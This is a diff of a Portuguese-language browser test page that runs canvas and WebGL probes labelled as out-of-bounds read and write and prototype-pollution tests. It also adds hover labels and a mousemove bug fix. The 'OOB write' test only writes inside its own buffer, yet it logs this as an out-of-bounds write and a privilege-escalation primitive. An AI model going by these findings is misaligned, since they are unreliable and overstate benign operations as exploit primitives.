+        const testOOBWriteOnly = async () => { /* ...código v15... */ const FNAME='testOOBWriteOnly'; logCanvas("--- Teste: OOB Write Only ---",'test', FNAME); const bufferOOBSize=64; const writeValue1=0xDEADBEEF; const writeValue2=0xCAFEBABE; const writeValueSize = 8; const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128; let bufferOOB=null; let dv=null; let writeSuccess=false; try{ bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return false; } const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`; try{ if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true); logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK.`, 'vuln', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write) ***`, 'escalation', FNAME); writeSuccess=true; } else { logCanvas(`Offset OOB ${relOffsetStr} fora do buffer alocado.`, 'error', FNAME); } }catch(e){ } logCanvas("--- Teste OOB Write Only Concluído ---",'test', FNAME); await PAUSE(); return writeSuccess; };
 
 
-        // --- Teste OOB Write Only --- (Logs info/subtest omitidos)
-        const testOOBWriteOnly = async () => {
-            const FNAME = 'testOOBWriteOnly';
-            logCanvas("--- Teste: OOB Write Only ---",'test', FNAME);
-            const bufferOOBSize=64; const writeValue1=0xDEADBEEF; const writeValue2=0xCAFEBABE; const writeValueSize = 8;
-             const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128;
-            let bufferOOB=null; let dv=null; let writeSuccess=false;
-            try{ // Log alocação omitido
-                 bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB);
-                 for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xDD);
-            }catch(e){ logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return false; } // Manter ERROR
-             const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`;
-             // Log tentativa omitido
-             try{
-                 if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){
-                     dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true);
-                     logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK.`, 'vuln', FNAME); // Manter VULN
-                      logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write) ***`, 'escalation', FNAME); // Manter ESCALATION
-                     writeSuccess=true;
-                 } else { logCanvas(`Offset OOB ${relOffsetStr} fora do buffer alocado.`, 'error', FNAME); } // Manter ERROR
-             }catch(e){ /* Warn omitido */ }
-             logCanvas("--- Teste OOB Write Only Concluído ---",'test', FNAME); // Manter resumo
-             await PAUSE(); return writeSuccess;
-        };
-
-
-        // --- Função Principal Canvas --- (Logs info/subtest omitidos)
+        // =======================================================================
+        // === FUNÇÃO PRINCIPAL DE TESTE DO CANVAS (v16) ==
+        // =======================================================================
         const runCanvasTestSequence = async () => {
             const FNAME = 'runCanvasTestSequence';
             outputDivCanvas = document.getElementById('output-canvas'); coordStatusDiv = document.getElementById('canvas-coord-status'); canvasElement = document.getElementById('interactive-canvas'); const runBtnCanvas = document.getElementById('runCanvasBtn');
-            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) { const errorMsg = "ERRO FATAL S2: Elementos HTML essenciais não encontrados!"; try { logCanvas(errorMsg, "critical", FNAME); } catch(e){} console.error(errorMsg); alert(errorMsg); return; } // Manter CRITICAL
+            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) { const errorMsg = "ERRO FATAL S2: Elementos HTML essenciais não encontrados!"; try { logCanvas(errorMsg, "critical", FNAME); } catch(e){} console.error(errorMsg); alert(errorMsg); return; }
             if (runBtnCanvas) runBtnCanvas.disabled = true; outputDivCanvas.innerHTML = '';
-            logCanvas("Iniciando sequência focada do Script 2 (v15 Logs Concisos)...", "test", FNAME); // Manter resumo
+            logCanvas("Iniciando sequência focada do Script 2 (v16)...", "test", FNAME);
 
+            // *** v16: Inicializar quadrados com hoverText (exemplo no primeiro) ***
             imgSquares.length = 0; let sqX = 10; let sqY = imgSquaresStartY;
-            for (let i = 0; i < 5; i++) { imgSquares.push({ id: `imgSq${i}`, x: sqX, y: sqY, size: imgSquareSize, color: 'green', hover: false }); sqX += imgSquareSize + imgSquareSpacing; }
-            // Log criação quadrados omitido
+            const squareActions = ['PP Adv', 'OOB Read', 'OOB Meta', 'OOB Img', 'WebGL+']; // Textos para hover
+            for (let i = 0; i < 5; i++) {
+                 imgSquares.push({
+                     id: `imgSq${i}`,
+                     x: sqX, y: sqY, size: imgSquareSize,
+                     color: 'green', hover: false,
+                     hoverText: squareActions[i] || `Act ${i}` // Adiciona hoverText
+                 });
+                 sqX += imgSquareSize + imgSquareSpacing;
+            }
 
             try {
-                try { ctx = canvasElement.getContext('2d'); if (!ctx) throw new Error("Falha ao obter contexto 2D."); } catch(e) { logCanvas(`Falha crítica ao obter contexto 2D: ${e.message}`, 'critical', FNAME); throw e; } // Manter CRITICAL
+                try { ctx = canvasElement.getContext('2d'); if (!ctx) throw new Error("Falha ao obter contexto 2D."); } catch(e) { logCanvas(`Falha crítica ao obter contexto 2D: ${e.message}`, 'critical', FNAME); throw e; }
                 redrawAll(); await PAUSE();
 
-                // Log leitura leak omitido (mas o resultado é logado abaixo)
-                try { if (typeof leakedValueFromOOB !== 'undefined') { const l = leakedValueFromOOB; if(l){ const ls = l.type==='U64' ? `L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}` : `L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> Leak S1 encontrado: ${ls}`, 'leak', FNAME); currentLeakData = {text: ls, color: "#FF9800"};} else { /* Warn omitido */ currentLeakData = {text:"L(S1):NULO", color:"#FFC107"}; } } else { logCanvas(`-> Variável global 'leakedValueFromOOB' do Script 1 não definida.`, 'error', FNAME); currentLeakData = {text:"L(S1):Var N/A", color:"#F44336"}; } } catch (e) { logCanvas(`Erro ao acessar leak S1: ${e.message}`, 'error', FNAME); currentLeakData = {text:"L(S1):ERRO", color:"#F44336"}; console.error(e); } // Manter LEAK/ERROR
+                try { if (typeof leakedValueFromOOB !== 'undefined') { const l = leakedValueFromOOB; if(l){ const ls = l.type==='U64' ? `L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}` : `L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> Leak S1 encontrado: ${ls}`, 'leak', FNAME); currentLeakData = {text: ls, color: "#FF9800"};} else { currentLeakData = {text:"L(S1):NULO", color:"#FFC107"}; } } else { logCanvas(`-> Variável global 'leakedValueFromOOB' do Script 1 não definida.`, 'error', FNAME); currentLeakData = {text:"L(S1):Var N/A", color:"#F44336"}; } } catch (e) { logCanvas(`Erro ao acessar leak S1: ${e.message}`, 'error', FNAME); currentLeakData = {text:"L(S1):ERRO", color:"#F44336"}; console.error(e); }
                 redrawAll(); await PAUSE();
 
                 let lastOOBWriteSuccess = false;
-                await testWebGLCheck(); // Log interno filtrado
-                await testAdvancedPP(); // Log interno filtrado
-                await testOOBReadEnhanced(); // Log interno filtrado
-                await testOOBWriteMetadata(); // Log interno filtrado
-                logCanvas("--- Iniciando Teste de Interação: OOB Write -> WebGL ---", 'test', FNAME); // Manter resumo teste
-                lastOOBWriteSuccess = await testOOBWriteOnly(); // Log interno filtrado
+                await testWebGLCheck();
+                await testAdvancedPP();
+                await testOOBReadEnhanced(); // Versão Refinada v16
+                await testOOBWriteMetadata();
+                logCanvas("--- Iniciando Teste de Interação: OOB Write -> WebGL ---", 'test', FNAME);
+                lastOOBWriteSuccess = await testOOBWriteOnly();
                  if (glContext) {
-                     // Log info omitido
-                     await testWebGLDeeperPlus(); // Log interno filtrado
-                     if (lastOOBWriteSuccess) {
-                          logCanvas(` ---> *** ALERTA POTENCIAL: WebGL funcionou sem erros após OOB Write. Investigar possível corrupção benigna ou interação não detectada. ***`, 'escalation', FNAME); // Manter ESCALATION
-                     }
-                 } else { /* Warn omitido */ }
-                 logCanvas("--- Teste de Interação: OOB Write -> WebGL Concluído ---", 'test', FNAME); // Manter resumo teste
+                     await testWebGLDeeperPlus();
+                     if (lastOOBWriteSuccess) { logCanvas(` ---> *** ALERTA POTENCIAL: WebGL funcionou sem erros após OOB Write. Investigar possível corrupção benigna ou interação não detectada. ***`, 'escalation', FNAME); }
+                 }
+                 logCanvas("--- Teste de Interação: OOB Write -> WebGL Concluído ---", 'test', FNAME);
                  await PAUSE();
-                await testOOBWriteToImageDataCheck(); // Log interno filtrado
+                await testOOBWriteToImageDataCheck();
 
-                logCanvas("--- Sequência principal de testes focados concluída ---", 'test', FNAME); // Manter resumo teste
+                logCanvas("--- Sequência principal de testes focados concluída ---", 'test', FNAME);
                 await PAUSE(100);
 
-                // Log adicionar listeners omitido
+                // Adicionar Listeners Interativos (com bug fixado)
+                logCanvas("Adicionando listeners interativos (Canvas + Quadrados)...", 'info', FNAME); // Log INFO mantido aqui para clareza
                 if(canvasClickListener && canvasElement) { try { canvasElement.removeEventListener('click', canvasClickListener); } catch(e){} }
                 if(canvasMoveListener && canvasElement) { try { canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e){} }
-                // Lógica dos listeners permanece a mesma, mas seus logs internos (mousemove, click fora) serão omitidos
-                canvasMoveListener = (event) => { /* ... lógica ... */ try { /* ... */ if(needsRedraw){ redrawAll(); } canvasElement.style.cursor = cursorStyle; if(coordStatusDiv) coordStatusDiv.textContent=`Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`; } catch(e){ logCanvas(`Erro no listener de mousemove: ${e.message}`, 'error', 'MouseMove'); console.error(e); } }; // Manter ERROR
-                canvasClickListener = async (event) => { const FNAME_CLICK = 'CanvasClick'; try{ /* ... lógica ... */ if(clickedArea){ logCanvas(`--> Click Área Interativa: ${clickedArea.text} (ID: ${clickedArea.id})`,'vuln', FNAME_CLICK); switch(clickedArea.id){ /* ... ações ... */ case 'rect-link': /* ... */ try{ /* ... */ }catch(e){ logCanvas('Erro ao chamar window.open: '+e.message,'error', FNAME_CLICK);} break; case 'rect-rerun': /* ... */ try { /* ... */ }catch(e){ logCanvas(`Erro re-ler leak S1: ${e.message}`,'error', FNAME_CLICK);} redrawAll(); break;}} else if (clickedSquareIndex !== -1){ const sq = imgSquares[clickedSquareIndex]; logCanvas(`--> Click Quadrado Interativo ID: ${sq.id}`, 'vuln', FNAME_CLICK); let actionError = null; if (runBtnCanvas) runBtnCanvas.disabled = true; logCanvas(`Executando ação para ${sq.id}...`, 'test', FNAME_CLICK); try { switch(sq.id) { /* ... re-runs ... */ } logCanvas(`Ação ${sq.id} concluída.`, 'good', FNAME_CLICK); } catch (e) { logCanvas(`Erro durante ação ${sq.id}: ${e.message}`, 'error', FNAME_CLICK); console.error(`Erro ação ${sq.id}:`, e); actionError = e; } finally { sq.color = actionError ? 'orange' : 'purple'; redrawAll(); if (runBtnCanvas) runBtnCanvas.disabled = false; logCanvas(`Re-run ${sq.id} finalizado.`, 'test', FNAME_CLICK); } } else { /* Log click fora omitido */ } }catch(e){ logCanvas(`Erro GERAL no listener de clique: ${e.message}`,'error', FNAME_CLICK); console.error(e); if (runBtnCanvas) runBtnCanvas.disabled = false; } }; // Manter VULN, TEST, GOOD(concluído), ERROR
+
+                // *** v16: Listener de movimento com BUG FIX (declaração de needsRedraw movida) ***
+                canvasMoveListener = (event) => {
+                    let needsRedraw = false; // <<<<<<< BUG FIX: Declarada aqui fora do try
+                    try{
+                        const r = canvasElement.getBoundingClientRect();
+                        const x = event.clientX - r.left;
+                        const y = event.clientY - r.top;
+                        //let needsRedraw = false; // <<<<< REMOVIDA DAQUI
+                        let foundTargetId = null;
+                        let cursorStyle = 'default';
+                        let currentSquareHover = -1;
+
+                        for(const a of interactiveAreas){ if(x>=a.x && x<=a.x+a.w && y>=a.y && y<=a.y+a.h){ foundTargetId=a.id; cursorStyle='pointer'; break; }}
+                        if(!foundTargetId){ for(let i=0; i<imgSquares.length; i++){ const sq=imgSquares[i]; if(x>=sq.x && x<=sq.x+sq.size && y>=sq.y && y<=sq.y+sq.size){ foundTargetId=sq.id; cursorStyle='crosshair'; currentSquareHover=i; if(!sq.hover){ sq.hover=true; needsRedraw=true; }} else { if(sq.hover){ sq.hover=false; needsRedraw=true; }}}}
+                        else { imgSquares.forEach(sq=>{if(sq.hover){sq.hover=false; needsRedraw=true;}}); }
+                        if(foundTargetId !== currentHoverTarget){ currentHoverTarget=foundTargetId; needsRedraw=true; }
+
+                        if(needsRedraw){ redrawAll(); } // Agora deve funcionar
+                        canvasElement.style.cursor = cursorStyle;
+                        if(coordStatusDiv) coordStatusDiv.textContent=`Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`;
+                    }catch(e){
+                        logCanvas(`Erro no listener de mousemove: ${e.message}`, 'error', 'MouseMove');
+                        console.error(e);
+                    }
+                };
+
+                // Listener de clique (lógica interna da v15 mantida)
+                canvasClickListener = async (event) => { /* ...código v15... */ const FNAME_CLICK = 'CanvasClick'; try{ const r=canvasElement.getBoundingClientRect(); const x=event.clientX-r.left; const y=event.clientY-r.top; let clickedArea=null; let clickedSquareIndex=-1; for(const a of interactiveAreas){if(x>=a.x && x<=a.x+a.w && y>=a.y && y<=a.y+a.h){ clickedArea = a; break; }} if(!clickedArea){for(let i = 0; i < imgSquares.length; i++){ const sq = imgSquares[i]; if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size){ clickedSquareIndex = i; break; } } } if(clickedArea){ logCanvas(`--> Click Área Interativa: ${clickedArea.text} (ID: ${clickedArea.id})`,'vuln', FNAME_CLICK); switch(clickedArea.id){ case 'rect-log': break; case 'rect-link': try{ const nW=window.open('https://google.com','_blank'); if(!nW) logCanvas('Falha ao abrir pop-up (bloqueado pelo navegador?).','warn', FNAME_CLICK); }catch(e){ logCanvas('Erro ao chamar window.open: '+e.message,'error', FNAME_CLICK);} break; case 'rect-rerun': try { if (typeof leakedValueFromOOB !== 'undefined') { const l=leakedValueFromOOB; if(l){ const lS=l.type==='U64'?`ReL:U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}`:`ReL:U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> ${lS}`,'leak', FNAME_CLICK); currentLeakData={text:lS,color:"#FF9800"};}else{ currentLeakData={text:"ReL:NULO",color:"#FFC107"};}}else{ logCanvas(`-> Var leakedValueFromOOB N/A.`,'error', FNAME_CLICK); currentLeakData={text:"ReL:Var N/A",color:"#F44336"};}}catch(e){ logCanvas(`Erro re-ler leak S1: ${e.message}`,'error', FNAME_CLICK); currentLeakData={text:"ReL:ERRO",color:"#F44336"};} redrawAll(); break;}} else if (clickedSquareIndex !== -1){ const sq = imgSquares[clickedSquareIndex]; logCanvas(`--> Click Quadrado Interativo ID: ${sq.id}`, 'vuln', FNAME_CLICK); let actionError = null; if (runBtnCanvas) runBtnCanvas.disabled = true; logCanvas(`Executando ação para ${sq.id}...`, 'test', FNAME_CLICK); try { switch(sq.id) { case 'imgSq0': await testAdvancedPP(); break; case 'imgSq1': await testOOBReadEnhanced(); break; case 'imgSq2': await testOOBWriteMetadata(); break; case 'imgSq3': await testOOBWriteToImageDataCheck(); break; case 'imgSq4': if (!glContext) { logCanvas("WebGL não ativo, pulando re-run.", "warn", FNAME_CLICK); } else { await testWebGLDeeperPlus(); } break; default: logCanvas(`Ação não definida para ${sq.id}`, 'warn', FNAME_CLICK); } logCanvas(`Ação ${sq.id} concluída.`, 'good', FNAME_CLICK); } catch (e) { logCanvas(`Erro durante ação ${sq.id}: ${e.message}`, 'error', FNAME_CLICK); console.error(`Erro ação ${sq.id}:`, e); actionError = e; } finally { sq.color = actionError ? 'orange' : 'purple'; redrawAll(); if (runBtnCanvas) runBtnCanvas.disabled = false; logCanvas(`Re-run ${sq.id} finalizado.`, 'test', FNAME_CLICK); } } }catch(e){ logCanvas(`Erro GERAL no listener de clique: ${e.message}`,'error', FNAME_CLICK); console.error(e); if (runBtnCanvas) runBtnCanvas.disabled = false; } }; // Manter VULN, TEST, GOOD, ERROR
+
                 canvasElement.addEventListener('click', canvasClickListener);
                 canvasElement.addEventListener('mousemove', canvasMoveListener);
-                // Log listeners adicionados omitido
+                logCanvas("Listeners de mouse (click, mousemove) adicionados ao canvas.", 'info', FNAME); // Manter INFO
                 redrawAll();
-                // Log teste pronto omitido
+                logCanvas("-> TESTE INTERATIVO PRONTO <- Passe o mouse sobre os blocos verdes!", 'info', FNAME); // Manter INFO
 
             } catch(e) {
-                 logCanvas(`Erro GERAL não tratado no SCRIPT 2: ${e.message}`, 'critical', FNAME); // Manter CRITICAL
+                 logCanvas(`Erro GERAL não tratado no SCRIPT 2: ${e.message}`, 'critical', FNAME);
                  console.error("Erro GERAL SCRIPT 2:", e);
                  if(e.stack) console.error(e.stack);
                   if (runBtnCanvas) runBtnCanvas.disabled = false;
              }
              finally {
-                 logCanvas("--- Fim da execução automática da sequência do Script 2 ---", 'test', FNAME); // Manter resumo
+                 logCanvas("--- Fim da execução automática da sequência do Script 2 ---", 'test', FNAME);
              }
         };
 
